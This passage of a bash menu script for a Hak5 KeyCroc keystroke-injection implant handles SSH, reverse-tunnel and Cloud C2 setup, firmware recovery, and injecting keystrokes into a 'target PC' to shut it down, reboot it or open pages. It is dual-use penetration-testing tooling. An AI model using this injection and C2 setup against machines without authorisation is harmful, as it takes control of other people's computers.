MenuColor 2 USERNAME/IP AND COMMAND ; echo -ne " ${clear}\n"
MenuColor 3 COMMAND TO PINEAPPLE ; echo -ne "    ${clear}\n"
MenuColor 4 COMMAND TO SQUIRREL ; echo -ne "     ${clear}\n"
MenuColor 5 COMMAND TO TURTLE ; echo -ne "       ${clear}\n"
MenuColor 6 COMMAND TO SHARK ; echo -ne "        ${clear}\n"
MenuColor 7 COMMAND TO BUNNY ; echo -ne "        ${clear}\n"
MenuColor 8 RETURN TO MAIN MENU ; echo -ne "     ${clear}\n"
MenuEnd
	case $m_a in
	1) pc_target_command ; command_menu ;;
	2) input_command ; command_menu ;;
	3) target_command root 172.16.42.1 ; command_menu ;;
	4) target_command root 172.16.32.1 ; command_menu ;;
	5) target_command root 172.16.84.1 ; command_menu ;;
	6) target_command root ${IP_F} ; command_menu ;;
	7) target_command root localhost -p 7000 ; command_menu ;;
	8) main_menu ;;
	0) exit 0 ;;
	[bB]) croc_reverse_shell ;;
	*) invalid_entry ; remote_command ;;
	esac
}
command_menu
}
##
#----SSH croc reverse shell Menu
##
MenuTitle REVERSE SSH TUNNEL MENU
MenuColor 1 REVERSE TUNNEL NETCAT ; echo -ne "    ${clear}\n"
MenuColor 2 CROC LISTENING ; echo -ne "           ${clear}\n"
MenuColor 3 REVERSE TUNNEL PAYLOAD ; echo -ne "   ${clear}\n"
MenuColor 4 REVERSE TUNNEL TARGET PC ; echo -ne " ${clear}\n"
MenuColor 5 REVERSE TUNNEL VPS ; echo -ne "       ${clear}\n"
MenuColor 6 REMOTE COMMANDS TARGETS ; echo -ne "  ${clear}\n"
MenuColor 7 RETURN TO MAIN MENU ; echo -ne "      ${clear}\n"
MenuEnd
	case $m_a in
	1) remote_listener ; croc_reverse_shell ;;
	2) croc_listener ; croc_reverse_shell ;;
	3) reverse_payload ; croc_reverse_shell ;;
	4) shell_pc ; croc_reverse_shell ;;
	5) ssh_tunnel ; croc_reverse_shell ;;
	6) remote_command ;;
	7) main_menu ;;
	0) exit 0 ;;
	[bB]) ssh_menu ;;
	*) invalid_entry ; croc_reverse_shell ;;
	esac
}
##
#----SSH remove ssh-keygen -f "/root/.ssh/known_hosts" -R (IP)
##
remove_sshkey() {
	clear
	echo -ne "$(Info_Screen '-Add correct host key in /root/.ssh/known_hosts to get rid of this message
-remove with: ssh-keygen -f "/root/.ssh/known_hosts" -R IP
-Just add the IP to remove ssh-keygen')\n\n"
read_all REMOVE SSH_KEYGEN FOR PACIFIC IP Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	read_all ENTER THE IP FOR SSH_KEYGEN REMOVAL AND PRESS [ENTER]
	ssh-keygen -f "/root/.ssh/known_hosts" -R ${r_a} ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Did not make any changes')\n" ;;
*)
	invalid_entry ; remove_sshkey ;;
esac
}
##
#----SSH Menu
## 
	LED B
echo -ne "\n" ; MenuTitle CROC POT SSH MENU | tr '\n' '\t' ; echo -ne "\n"
echo -ne "\t\t" ; MenuColor 1 SSH TARGET PC | tr -d '\t' ; echo -ne "   ${clear}" ; MenuColor 8 SIGNAL OWL | tr -d '\t' ; echo -ne "           ${clear}\n"
echo -ne "\t\t" ; MenuColor 2 SSH USER INPUT | tr -d '\t' ; echo -ne "  ${clear}" ; MenuColor 9 SHARK JACK | tr -d '\t' ; echo -ne "           ${clear}\n"
echo -ne "\t\t" ; MenuColor 3 ENABLE_SSH | tr -d '\t' ; echo -ne "      ${clear}" ; MenuColor 10 BASH BUNNY | tr -d '\t' ; echo -ne "          ${clear}\n"
echo -ne "\t\t" ; MenuColor 4 DISABLE_SSH | tr -d '\t' ; echo -ne "     ${clear}" ; MenuColor 11 REVERSE SHELL | tr -d '\t' ; echo -ne "       ${clear}\n"
echo -ne "\t\t" ; MenuColor 5 WIFI PINEAPPLE | tr -d '\t' ; echo -ne "  ${clear}" ; MenuColor 12 PUBLIC/PRIVATE KEY | tr -d '\t' ; echo -ne "  ${clear}\n"
echo -ne "\t\t" ; MenuColor 6 PACKET SQUIRREL | tr -d '\t' ; echo -ne " ${clear}" ; MenuColor 13 REMOVE SSH_KEYGEN | tr -d '\t' ; echo -ne "   ${clear}\n"
echo -ne "\t\t" ; MenuColor 7 LAN TURTLE | tr -d '\t' ; echo -ne "      ${clear}" ; MenuColor 14 RETURN TO MAIN MENU | tr -d '\t' ; echo -ne " ${clear}\n"
MenuEnd
	case $m_a in
	1) pc_ssh ; ssh_menu ;;
	2) userinput_ssh ; ssh_menu ;;
	3) ENABLE_SSH ; ssh_menu ;;
	4) DISABLE_SSH ; ssh_menu ;;
	5) ssh_pineapple ; ssh_menu ;;
	6) ssh_squirrel ; ssh_menu ;;
	7) ssh_turtle ; ssh_menu ;;
	8) ssh_owl ; ssh_menu ;;
	9) ssh_shark ; ssh_menu ;;
	10) ssh_bunny ; ssh_menu ;;
	11) croc_reverse_shell ; ssh_menu ;;
	12) ssh_keygen ; ssh_menu ;;
	13) remove_sshkey ; ssh_menu ;;
	14) main_menu ;;
	0) exit 0 ;;
	[bB]) main_menu ;;
	*) invalid_entry ; ssh_menu ;;
	esac
}
##
#----Keycroc recovery menu/function
##
function croc_recovery() {
	clear
	echo -ne "$(Info_Screen '-Download The lastest firmware from Hak5
-This will save the Firmware to the keycroc tools folder
-Restore the keycroc firmware with the lastest firmware
-factory recovery will bring you to Hak5 factory recovery web page
-Remove this will remove the lastest firmware from tools folder')\n"
##
#----Download lastest firmware function
##
croc_firmware() {
	clear
	echo -ne "$(Info_Screen '-This will Download KeyCroc lastest firmware from Hak5
-Download center and place it in the tools folder
-for later recovery, Download may take some time')\n"
if [ -e /root/udisk/tools/kc_fw_1.3_510.tar.gz ]; then
	echo -ne "\n$(ColorGreen 'KeyCroc lastest firmware file already exists')\n"
else
	read_all DOWNLOAD LASTEST KEYCROC FIRMWARE Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	echo -ne "\n$(ColorYellow '-Downloading KeyCroc lastest firmware')\n"
	wget https://storage.googleapis.com/hak5-dl.appspot.com/keycroc/firmwares/1.3-stable/kc_fw_1.3_510.tar.gz -P /root/udisk/tools ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; croc_firmware ;;
esac
fi
}
##
#----hak5 factory recovery function
##
hak_factory() {
	echo -ne "\n$(ColorYellow 'Open Hak5 factory recovery web page')\n"
if [ "$(OS_CHECK)" = WINDOWS ]; then
	Q GUI d
	Q GUI r
	sleep 1
	Q STRING "powershell"
	Q ENTER
	sleep 2
	Q STRING "Start-Process https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset; exit"
	Q ENTER
else
	case $HOST_CHECK in
raspberrypi)
	Q GUI d
	sleep 1
	Q STRING "LXTerminal"
	Q ENTER
	Q ENTER
	sleep 1
	Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset; exit"
	Q ENTER ;;
parrot)
	Q ALT F2
	sleep 1
	Q STRING "mate-terminal"
	Q ENTER
	sleep 1
	Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset; exit"
	Q ENTER ;;
*)
	Q ALT F2
	sleep 1
	Q STRING "xterm"
	Q ENTER
	sleep 1
	Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset; exit"
	Q ENTER ;;
	esac
fi
}
##
#----Restore lastest firmware function
##
restore_firmware() {
	clear
	unset r_a
	echo -ne "\n$(ColorRed 'THIS WILL RESTORE THE KEYCROC TO THE LATEST FIRMWARE\n
	ARE YOU SURE Y/N AND PRESS [ENTER]:')"; read r_a
case $r_a in
	[yY] | [yY][eE][sS])
if [ -e /root/udisk/tools/kc_fw_1.3_510.tar.gz ]; then
		echo -ne "$(ColorYellow 'Moving Firmware to KeyCroc udisk
		This will take an couple of minutes')\n"
		cp /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk
		echo -ne "$(ColorGreen 'You can now unplug the KeyCroc and plug back in')\n"
else
	echo -ne "$(ColorRed 'DID NOT FIND KEYCROC FIRMWARE FILE PLEASE DOWNLOAD')\n"
fi ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Returning back to menu')\n"
		croc_recovery ;;
	*)
		invalid_entry ; restore_firmware ;;
esac
}
##
#----recovery repair locale LANG=en_US.UTF-8
##
locale_en_US() {
	clear
	echo -ne "\n$(Info_Screen '--This will fix LC_ALL=en_US.UTF-8 if you get this error at ssh 
--bash: warning: setlocale: LC_ALL: cannot change locale en_US.UTF-8
--This is for US language
--Not sure if this will work on other language keyboards')\n\n"
	read_all FIX THE ERROR Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	echo -ne "\n$(ColorGreen 'Repairing The error')\n"
	echo "LC_ALL=en_US.UTF-8" >> /etc/environment
	echo "en_US.UTF-8 UTF-8" >> /etc/locale.gen
	echo "LANG=en_US.UTF-8" > /etc/locale.conf
	locale-gen en_US.UTF-8
	echo -ne "\n$(ColorGreen 'Done Repairing The error unplug the keycroc and plug back in')\n" ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Returning back to menu')\n"
	croc_recovery ;;
*)
	invalid_entry ; croc_recovery ;;
esac
}
##
#----Remove Croc_Pot and all contents
##
remove_croc_pot() {
	clear
	echo -ne "\n$(Info_Screen '-Completely remove Croc_Pot and all its contents from the KeyCroc')\n\n"
	echo -ne "$(ColorRed 'ARE YOU SURE TO REMOVE CROC_POT TYPE YES OR NO AND PRESS [ENTER]:')"; read CROC_POT_REMOVE
case $CROC_POT_REMOVE in
[yY] | [yY][eE][sS])
	apt -y remove unzip openvpn mc nmon sshpass screenfetch whois dnsutils sslscan
	rm -r /var/hak5c2 /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot/Bunny_Payload_Shell /root/udisk/tools/Croc_Pot
	rm /usr/local/bin/c2-3.1.2_armv7_linux /etc/systemd/system/hak5.service /root/udisk/payloads/Getonline_Linux.txt
	rm /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk/payloads/Croc_Pot_Payload.txt
	rm /root/udisk/payloads/Croc_unlock_1.txt /root/udisk/payloads/Croc_unlock_2.txt
	rm /root/udisk/payloads/Getonline_Raspberry.txt /root/udisk/payloads/Quick_Start_C2.txt
	rm /root/udisk/payloads/Quick_start_Croc_Pot.txt /root/udisk/payloads/Getonline_Windows.txt
	rm /root/udisk/tools/Croc_Pot/Croc_OS.txt /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt
	rm /root/udisk/tools/Croc_Pot.sh /root/udisk/payloads/Croc_Shot.txt /root/udisk/payloads/Croc_Shell.txt
	apt-get autoremove
	exit 0 ;;
[nN] | [nN][oO])
	echo -e "\n$(ColorYellow 'Return Back to main menu')" ;;
*)
	invalid_entry ; remove_croc_pot
esac
}
##
#----Keycroc apt update/upgrade Packages
##
croc_update() {
	clear
	echo -ne "$(Info_Screen '-Update/Upgrade your KeyCroc Packages
-NOTE: This could break important Packages the keycroc needs to work properly')\n\n"
	read_all UPDATE KEYCROC PACKAGES Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	echo -ne "\n$(ColorGreen 'UPDATING AND UPGRADING THE KEYCROC PACKAGES')\n"
	apt update && apt upgrade -y ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'RETURING BACK TO MENU')\n" ;;
*)
	invalid_entry ; croc_update ;;
esac
}
##
#----Recovery Reboot/Shutdown target pc
##
reboot_shutdown() {
	clear
	echo -ne "$(Info_Screen '-Reboot or shutdown Target pc')\n\n"
shutdown_pc() {
if [ "$(OS_CHECK)" = WINDOWS ]; then
	Q GUI d
	Q GUI r
	sleep 1
	Q STRING "powershell"
	Q ENTER
	sleep 2
	Q STRING "Stop-Computer -ComputerName localhost"
	Q ENTER
else
	case $HOST_CHECK in
raspberrypi)
	Q GUI d
	sleep 1
	Q STRING "LXTerminal"
	Q ENTER
	Q ENTER
	sleep 1
	Q STRING "shutdown -h 0" 
	Q ENTER ;;
parrot)
	Q ALT F2
	sleep 1
	Q STRING "mate-terminal"
	Q ENTER
	sleep 1
	Q STRING "shutdown -h 0"
	Q ENTER ;;
*)
	Q ALT F2
	sleep 1
	Q STRING "xterm"
	Q ENTER
	sleep 1
	Q STRING "shutdown -h 0"
	Q ENTER ;;
	esac
fi
}
reboot_pc() {
if [ "$(OS_CHECK)" = WINDOWS ]; then
	Q GUI d
	Q GUI r
	sleep 1
	Q STRING "powershell"
	Q ENTER
	sleep 2
	Q STRING "Restart-Computer"
	Q ENTER
else
	case $HOST_CHECK in
raspberrypi)
	Q GUI d
	sleep 1
	Q STRING "LXTerminal"
	Q ENTER
	Q ENTER
	sleep 1
	Q STRING "shutdown -r 0" 
	Q ENTER ;;
parrot)
	Q ALT F2
	sleep 1
	Q STRING "mate-terminal"
	Q ENTER
	sleep 1
	Q STRING "shutdown -r 0"
	Q ENTER ;;
*)
	Q ALT F2
	sleep 1
	Q STRING "xterm"
	Q ENTER
	sleep 1
	Q STRING "shutdown -r 0"
	Q ENTER ;;
	esac
fi
}
##
#----Recovery Reboot/Shutdown menu
##
MenuTitle REBOOT/SHUTDOWN TARGET PC
MenuColor 1 SHUTDOWN TARGET PC ; echo -ne "  ${clear}\n"
MenuColor 2 REBOOT TARGET PC ; echo -ne "    ${clear}\n"
MenuColor 3 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
MenuEnd
	case $m_a in
	1) shutdown_pc ;;
	2) reboot_pc ;;
	3) main_menu ;;
	0) exit 0 ;;
	[bB]) croc_recovery ;;
	*) invalid_entry ; reboot_shutdown ;;
	esac
}
##
#----Recovery menu
##
MenuTitle KEYCROC RECOVERY MENU
MenuColor 1 DOWNLOAD LATEST FIRMWARE ; echo -ne "    ${clear}\n"
MenuColor 2 FACTORY RESET HOW TO ; echo -ne "        ${clear}\n"
MenuColor 3 RESTORE LASTEST FIRMWARE ; echo -ne "    ${clear}\n"
MenuColor 4 REMOVE LASTEST FIRMWARE ; echo -ne "     ${clear}\n"
MenuColor 5 REPAIR en_US.UTF-8 ERROR ; echo -ne "    ${clear}\n"
MenuColor 6 KEYCROC UPDATE PACKAGES ; echo -ne "     ${clear}\n"
MenuColor 7 REMOVE CROC_POT AN CONTENTS ; echo -ne " ${clear}\n"
MenuColor 8 REBOOT/SHUTDOWN TARGET PC ; echo -ne "   ${clear}\n"
MenuColor 9 RETURN TO MAIN MENU ; echo -ne "         ${clear}\n"
MenuEnd
	case $m_a in
	1) croc_firmware ; croc_recovery ;;
	2) hak_factory ; croc_recovery ;;
	3) restore_firmware ; croc_recovery ;;
	4) echo -ne "\n$(ColorYellow 'Removing lastest firmware file from tools folder')\n" ; rm /root/udisk/tools/kc_fw_1.3_510.tar.gz ; croc_recovery ;;
	5) locale_en_US ; croc_recovery ;;
	6) croc_update ; croc_recovery ;;
	7) remove_croc_pot ;;
	8) reboot_shutdown ; croc_recovery ;;
	9) main_menu ;;
	0) exit 0 ;;
	[bB]) main_menu ;;
	*) invalid_entry ; croc_recovery ;;
	esac
}
##
#----Hak5 Cloud_C2 meunu/function
##
function hak_cloud() {
	clear
	echo -ne "$(Info_Screen '-Run HAK5 Cloud C2 on the keycroc
-When running setup, maximize your screen to read Token keys properly
-To get Token keys Run #3 RELOAD HAK5 C2 until the keys show up
-May need to Unplug the keycroc plug back in and try again
-This will check to see if unzip is installed if not install it
-This will not start C2 on boot Next reboot run #4 RESTART HAK5 C2
-ON any device type in the keycroc IP into any web browser url,
-Device must be on same network as the keycroc and then to connect HAK5 C2')\n"
##
#----Hak5 Cloud_C2 install unzip
##
cloud_setup() {
	read_all DOWNLOAD AND INSTALL CLOUD C2 AND UNZIP Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	local status_zip="$(dpkg-query -W --showformat='${db:Status-Status}' "unzip" 2>&1)"
if [ ! $? = 0 ] || [ ! "$status_zip" = installed ]; then
	apt -y install unzip
fi
##
#----Hak5 Cloud_C2 download and install
##
if [ -e /var/hak5c2 ]; then
	echo -ne "\t\t${LINE_}$(ColorYellow 'HAK5 C2 is already installed on the keycroc')${LINE_}\n"
	hak_cloud
else
	echo -ne "\n\t\t${LINE_}$(ColorGreen 'Installing HAK5 C2 on the keycroc')${LINE_}\n"
	sleep 3
	wget https://c2.hak5.org/download/community -O /tmp/community && unzip /tmp/community -d /tmp
	sleep 5
	mv /tmp/c2-3.1.2_armv7_linux /usr/local/bin && mkdir /var/hak5c2
	echo -ne "[Unit]\nDescription=Hak5 C2\nAfter=hak5.service\n[Service]\nType=idle
ExecStart=/usr/local/bin/c2-3.1.2_armv7_linux -hostname $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) -listenport 80 -db /var/hak5c2/c2.db
[Install]\nWantedBy=multi-user.target" >> /etc/systemd/system/hak5.service
	sleep 1
	systemctl daemon-reload && systemctl start hak5.service
	sleep 5
	systemctl status hak5.service
	sleep 5
	echo -ne "\t\t${LINE_}$(ColorGreen 'HAK-5 Cloud C2 Installed, Starting C2 web UI')${LINE_}"
	sleep 5
	start_web
fi ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; cloud_setup ;;
esac
}
##
#----Hak5 Cloud_C2 start web brower
##
start_web() {
if [ "$(OS_CHECK)" = WINDOWS ]; then
	Q GUI d
	Q GUI r
	sleep 1
	Q STRING "powershell"
	Q ENTER
	sleep 2
	Q STRING "Start-Process http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-); exit"
	Q ENTER
else
	case $HOST_CHECK in
raspberrypi)
	Q GUI d
	sleep 1
	Q STRING "LXTerminal"
	Q ENTER
	Q ENTER
	sleep 1
	Q STRING "gio open http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-); exit"
	Q ENTER ;;
parrot)
	Q ALT F2
	sleep 1
	Q STRING "mate-terminal"
	Q ENTER
	sleep 1
	Q STRING "gio open http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-); exit"
	Q ENTER ;;
*)
	Q ALT F2
	sleep 1
	Q STRING "xterm"
	Q ENTER
	sleep 1
	Q STRING "gio open http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-); exit"
	Q ENTER ;;
	esac
fi
}
##
#----Hak5 Cloud_C2 reload
##
reload_cloud() {
	systemctl daemon-reload && systemctl start hak5.service
	sleep 5
	systemctl status hak5.service
	sleep 5
}
##
#----Hak5 Cloud_C2 remove C2
##
remove_cloud() {
	rm -r /var/hak5c2
	rm /usr/local/bin/c2-3.1.2_armv7_linux
	rm /etc/systemd/system/hak5.service
}
##
#----Quick start Cloud_C2 (payload)
##
quick_cloud() {
	local quickcloud=/root/udisk/payloads/Quick_Start_C2.txt
	clear
	echo -ne "$(Info_Screen '-Will need to install Cloud C2 frist on the keycroc
-This will install Quick_Start_C2.txt in the payload folder
-Use this to start C2 from a payload
-Type in startc2 this will automatically start Hak5 cloud C2')\n"
if [ -e "${quickcloud}" ]; then
	echo -ne "\n$(ColorGreen 'Quick_Start_C2.txt already exist check payloads folder\n')"
else
	read_all INSTALL QUICK START CLOUD C2 PAYLOAD Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
	echo -ne "MATCH startc2\nCROC_OS=/root/udisk/loot/Croc_OS.txt\nif [ -e \${CROC_OS} ]; then\nLED G\nsystemctl restart hak5.service
sleep 5\nOS_CHECK=\$(sed -n 1p \${CROC_OS})\nif [ \"\${OS_CHECK}\" = WINDOWS ]; then\nQ GUI d\nQ GUI r\nsleep 1\nQ STRING \"powershell\"
Q ENTER\nsleep 2\nQ STRING \"Start-Process http://\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
Q ENTER\nsleep 5\nQ ALT-TAB\nsleep 2\nQ STRING \"exit\"\nQ ENTER\nelse\nHOST_CHECK=\$(sed -n 3p \${CROC_OS})\ncase \$HOST_CHECK in
raspberrypi)\nQ GUI d\nsleep 1\nQ STRING \"terminal\"\nQ ENTER\nQ ENTER\nsleep 1\nQ STRING \"gio open http://\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
Q ENTER\nsleep 5\nQ ALT-TAB\nsleep 1\nQ ALT-F4;;\nparrot)\nQ ALT F2\nsleep 1\nQ STRING \"mate-terminal\"\nQ ENTER\nsleep 1
Q STRING \"gio open http://\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\nQ ENTER\nsleep 5\nQ ALT-TAB
sleep 1\nQ ALT-F4;;\n*)\nQ ALT F2\nsleep 1\nQ STRING \"xterm\"\nQ ENTER\nsleep 1\nQ STRING \"gio open http://\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
Q ENTER\nsleep 5\nQ ALT-TAB\nsleep 1\nQ ALT-F4;;\nesac\nfi\nelse\nLED G\nsystemctl restart hak5.service\nsleep 5\nfi" >> ${quickcloud}
	echo -ne "\n$(ColorGreen 'Quick_Start_C2.txt is now installed check payloads folder\n')" ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; quick_cloud ;;
	esac
fi
}
##
#----Save Cloud_C2 setup/ip function
##
save_ip() {
	clear
	echo -ne "$(Info_Screen '- #1 will save the IP,Netmask,Gateway that is setup with C2
- #2 will restore the keycroc to saved IP,Netmask,Gateway
- #3 Manually add IP,Netmask,Gateway')\n"
save_setup() {
	local cloud_ip=/root/udisk/tools/Croc_Pot/C2_IP.txt
run_save_v() {
	ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6- | tee ${cloud_ip}
	/sbin/ifconfig wlan0 | awk '/Mask:/ {print $4;}' | sed -e 's/Mask://g' -e 's/^[\t]*//' | tee -a ${cloud_ip}
	ip r | grep default | sed -e 's/default//g' -e 's/via//g' -e 's/dev//g' -e 's/wlan0//g' -e 's/^[[:space:]]*//g' | tee -a ${cloud_ip}
}
if [ -e "${cloud_ip}" ]; then
	echo -ne "\n$(ColorGreen 'C2_IP.txt file already exists')\n"
	read_all REMOVE EXISTING AND SAVE NEW SETUP Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	echo -ne "\n$(ColorRed 'REMOVING EXISTING SETUP AND SAVING NEW')\n"
	rm ${cloud_ip}
	run_save_v ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'KEEPING EXISTING SETUP')\n" ;;
*)
	invalid_entry ; save_ip ;;
esac
else
	echo -ne "\n$(ColorYellow 'SAVING SETUP IP TO TOOLS/CROC_POT')\n"
	run_save_v
fi
}
##
#----Hak5 Cloud_C2 restore ip to first setup
#----restore ip just for this session
##
restore_ip() {
	clear
	echo -ne "\n$(ColorYellow 'This will restore keycroc IP back to the IP when C2 was frist setup')\n"
if [ -e "${cloud_ip}" ]; then
	echo -ne "$(ColorYellow 'Keycroc IP will change to this IP now  ')$(sed -n 1p ${cloud_ip})\n"
	echo -ne "$(ColorYellow 'Will need to start new ssh with this IP')$(sed -n 1p ${cloud_ip})\n"
	read_all CHANGE KEYCROC IP Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	ifconfig wlan0 $(sed -n 1p ${cloud_ip}) netmask $(sed -n 2p ${cloud_ip}); route add default gw $(sed -n 3p ${cloud_ip}) wlan0; ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'KEEPING EXISTING SETUP')\n" ;;
*)
	invalid_entry ; save_ip ;;
esac
else
	echo -ne "\n$(ColorRed 'DID NOT FIND ANY SAVED C2 SETTING PLEASE RUN #1 SAVE C2 SETUP IP')\n"
	run_save_v
fi
}
##
#----Hak5 Cloud_C2 edit the ip to use for C2
##
edit_ip() {
	clear
	echo -ne "\n$(ColorYellow 'Manually Enter IP,Netmask,Gateway for your keycroc')\n"
	read_all CHANGE KEYCROC IP Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	echo -ne "$(ColorBlue 'ENTER IP TO BE USED AND PRESS [ENTER] ')"; read ip_e
	echo -ne "$(ColorBlue 'ENTER NETMASK TO BE USED AND PRESS [ENTER] ')"; read mask_e
	echo -ne "$(ColorBlue 'ENTER GATEWAY TO BE USED AND PRESS [ENTER] ')"; read gate_e
	ifconfig wlan0 ${ip_e} netmask ${mask_e}; route add default gw ${gate_e} wlan0; ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'KEEPING EXISTING SETUP')\n" ;;
*)
	invalid_entry ; save_ip ;;
esac
}
##
#----Hak5 C2 ip restore Menu
##
MenuTitle SAVE C2 SETUP IP MENU
MenuColor 1 SAVE C2 SETUP IP ; echo -ne "    ${clear}\n"
MenuColor 2 RESTORE C2 SETUP IP ; echo -ne " ${clear}\n"
MenuColor 3 EDIT CROC IP ; echo -ne "        ${clear}\n"
MenuColor 4 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
MenuEnd
	case $m_a in
	1) save_setup ; save_ip ;;
	2) restore_ip ; save_ip ;;
	3) edit_ip ; save_ip ;;
	4) main_menu ;;
	0) exit 0 ;;
	[bB]) hak_cloud ;;
	*) invalid_entry ; save_ip ;;
	esac
}
##
#----Hak5 Cloud_C2 menu
##
MenuTitle HAK5 CLOUD C2 MENU
MenuColor 1 HAK5 C2 SETUP ; echo -ne "        ${clear}\n"
MenuColor 2 START HAK5 C2 ; echo -ne "        ${clear}\n"
MenuColor 3 RELOAD HAK5 C2 ; echo -ne "       ${clear}\n"
MenuColor 4 RESTART HAK5 C2 ; echo -ne "      ${clear}\n"
MenuColor 5 STOP HAK5 C2 ; echo -ne "         ${clear}\n"
MenuColor 6 REMOVE HAK5 C2 ; echo -ne "       ${clear}\n"
MenuColor 7 EDIT HAK5 C2 ; echo -ne "         ${clear}\n"
MenuColor 8 QUICK START C2 ; echo -ne "       ${clear}\n"
MenuColor 9 SAVE C2 SETUP IP ; echo -ne "     ${clear}\n"
MenuColor 10 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
MenuEnd
	case $m_a in
	1) cloud_setup ; hak_cloud ;;
	2) start_web ; hak_cloud ;;
	3) reload_cloud ; hak_cloud ;;
	4) systemctl restart hak5.service ; start_web ; hak_cloud ;;
	5) systemctl stop hak5.service ; hak_cloud ;;
	6) remove_cloud ; hak_cloud ;;
	7) nano /etc/systemd/system/hak5.service ; hak_cloud ;;
	8) quick_cloud ; hak_cloud ;;
	9) save_ip ; hak_cloud ;;
	10) main_menu ;;
	[bB]) main_menu ;;
	0) exit 0 ;;
	*) invalid_entry ; hak_cloud ;;
	esac
}
##
#----Croc_Pot Main Menu
##
function main_menu() {
	LED B
	clear
	croc_title
MenuTitle CROC POT MAIN MENU
MenuColor 1 CROC MAIL ; echo -ne "     ${blue} ${array[4]} ${clear} \n"
MenuColor 2 CROC POT PLUS ; echo -ne " ${red} ${array[5]} ${clear} \n"
MenuColor 3 KEYCROC STATUS ; echo -ne "${green} ${array[6]} ${clear} \n"
MenuColor 4 KEYCROC LOGS ; echo -ne "  ${white} ${array[7]} ${clear} \n"
MenuColor 5 KEYCROC EDIT ; echo -ne "  ${yellow} ${array[8]} ${clear} \n"
MenuColor 6 SSH MENU ; echo -ne "      ${blue} ${array[9]} ${clear} \n"
MenuColor 7 RECOVERY MENU ; echo -ne " ${green} ${array[10]} ${clear} \n"
MenuColor 8 HAK5 CLOUD C2 ; echo -ne " ${white} ${array[11]} ${clear} \n"
MenuEnd
	case $m_a in
	1) croc_mail ;;
	2) croc_pot_plus ;;
	3) croc_status ;;
	4) croc_logs_mean ;;
	5) croc_edit_menu ;;
	6) ssh_menu ;;
	7) croc_recovery ;;
	8) hak_cloud ;;
	0) exit 0 ;;
	*) invalid_entry ; main_menu ;;
	esac
}
main_menu
exit
